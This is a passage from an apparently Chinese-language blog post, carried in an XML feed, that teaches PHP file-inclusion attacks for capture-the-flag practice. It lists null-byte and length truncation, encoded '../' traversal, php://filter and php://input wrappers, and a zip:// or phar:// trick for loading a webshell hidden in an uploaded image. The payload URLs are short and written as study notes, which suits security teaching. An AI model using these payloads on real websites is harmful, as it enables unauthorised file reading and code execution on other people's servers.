title="(1).%00截断"></a>(1).%00截断</h3><p>需要PHP&lt;5.3.4并且magic_quotes_gpc = Off</p><pre class="line-numbers language-none"><code class="language-none">/include.php?page=info.txt%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-长度截断"><a href="#2-长度截断" class="headerlink" title="(2).长度截断"></a>(2).长度截断</h3><p>PHP版本&lt;=5.2.?</p><blockquote><p>Windows下目录最大长度为256字节，超出的部分会被丢弃掉<br>Linux下目录最大长度为4096字节，超出的部分会被丢弃掉</p></blockquote><p>构造payload的时候超出限制即可</p><p>类似于</p><pre class="line-numbers language-none"><code class="language-none">/include.php?page=info.txt....................*n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-伪协议"><a href="#3-伪协议" class="headerlink" title="(3).伪协议"></a>(3).伪协议</h3><pre class="line-numbers language-none"><code class="language-none">zip://文件路径/zip文件名称#压缩包内的文件名称 （使用时注意将#号进行URL编码）phar://文件路径/phar文件名称/phar内的文件名称phar://协议与zip://类似，同样可以访问zip格式压缩包内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>多配合在上传题使用</p><p>若发现只有jpg、png才可以上传文件</p><p>则可以利用phar伪协议</p><p>写一个shell 将后缀名改成.php 再将其压缩，再改成*.jpg、*.png 此时可以上传<br>提示成功后，利用菜刀添加/include.php?file=phar*://***/a.png/a即可</p><pre class="line-numbers language-none"><code class="language-none">?file=zip://D:\zip.jpg%23phpinfo?file=phar://zip.zip/phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-限制前缀"><a href="#4-限制前缀" class="headerlink" title="4.限制前缀"></a>4.限制前缀</h2><p>例如<code>../</code>被过滤</p><p>可以利用url编码</p><pre class="line-numbers language-none"><code class="language-none">../%2e%2e%2f..%2f%2e%2e/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>或者二次编码</p><pre class="line-numbers language-none"><code class="language-none">../%252e%252e%252f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="5-PHP伪协议"><a href="#5-PHP伪协议" class="headerlink" title="5.PHP伪协议"></a>5.PHP伪协议</h2><h3 id="1-file-协议"><a href="#1-file-协议" class="headerlink" title="(1).file:// 协议"></a>(1).file:// 协议</h3><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p><pre class="line-numbers language-none"><code class="language-none">POC/include.php?file=file://phpinfo.txt/include.php?file=http://127.0.0.1/phpinfo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-php-协议"><a href="#2-php-协议" class="headerlink" title="(2).php://协议"></a>(2).php://协议</h3><p><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</p><pre class="line-numbers language-none"><code class="language-none">php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th><strong>协议</strong></th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype="multipart/form-data"</code> 的时候<code>php://input </code>是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><h4 id="1-php-filter"><a href="#1-php-filter" class="headerlink" title="1.php://filter"></a>1.php://filter</h4><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。</p><p>对于php://来说，是支持多种过滤器嵌套的</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">php<span class="token punctuation">:</span><span class="token string regex">//</span>filter<span class="token string regex">/[read|write]=[过滤器1]|[过滤器2]/</span>resource<span class="token operator">=</span>文件名称（包含后缀名）#如果<span class="token operator">|</span>被过滤掉了，可以使用多过滤器<span class="token punctuation">:</span>php<span class="token punctuation">:</span><span class="token string regex">//</span>filter<span class="token string regex">/string.rot13/</span>resource<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token string regex">//</span>filter<span class="token string regex">/convert.base64-encode/</span>resource<span class="token operator">=</span>文件名称（包含后缀名）嵌套过程的执行流程为从左到右<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其实是可以简写成这样的<code>php://filter/[过滤器]</code> ，php会自己进行识别。</p><p>过滤器列表:</p><table><thead><tr><th>过滤器名称</th><th>说明</th><th>类别</th><th>版本</th></tr></thead><tbody><tr><td>string.rot13</td><td>rot13转换</td><td>字符串过滤器</td><td>PHP&gt;4.3.0</td></tr><tr><td>string.toupper、string.tolower</td><td>大小写互转</td><td>字符串过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>convert.base64-encode、convert.base64-decode</td><td>base64编码转换</td><td>转换过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>convert.quoted-printable-encode、convert.quoted-printable-decode</td><td>URL编码转换</td><td>转换过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>convert.iconv.编码1.编码2</td><td>任意编码转换</td><td>转换过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>zlib.deflate、zlib.inflate</td><td>zlib压缩</td><td>压缩过滤器</td><td>PHP&gt;5.1.0</td></tr><tr><td>bzip2.compress、bzip2.decompress</td><td>zlib压缩</td><td>压缩过滤器</td><td>PHP&gt;5.1.0</td></tr></tbody></table><h2 id="6-PHP伪协议常用函数"><a href="#6-PHP伪协议常用函数" class="headerlink" title="6.PHP伪协议常用函数"></a>6.PHP伪协议常用函数</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h1><blockquote><p><a href="https://blog.csdn.net/qq_42181428/article/details/87090539">https://blog.csdn.net/qq_42181428/article/details/87090539</a></p><p><a href="https://blog.csdn.net/bmth666/article/details/104616201">https://blog.csdn.net/bmth666/article/details/104616201</a></p><p><a href="https://www.anquanke.com/post/id/231407#h3-6">https://www.anquanke.com/post/id/231407#h3-6</a></p><p><a href="https://www.cnblogs.com/jzking121/p/15144416.html">https://www.cnblogs.com/jzking121/p/15144416.html</a></p><p><a href="https://blog.csdn.net/qq_42181428/article/details/87090539?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_aggregation-2-87090539.pc_agg_rank_aggregation&amp;utm_term=ctf+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&amp;spm=1000.2123.3001.4430">https://blog.csdn.net/qq_42181428/article/details/87090539?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_aggregation-2-87090539.pc_agg_rank_aggregation&amp;utm_term=ctf+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&amp;spm=1000.2123.3001.4430</a></p><p><a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
</feed>
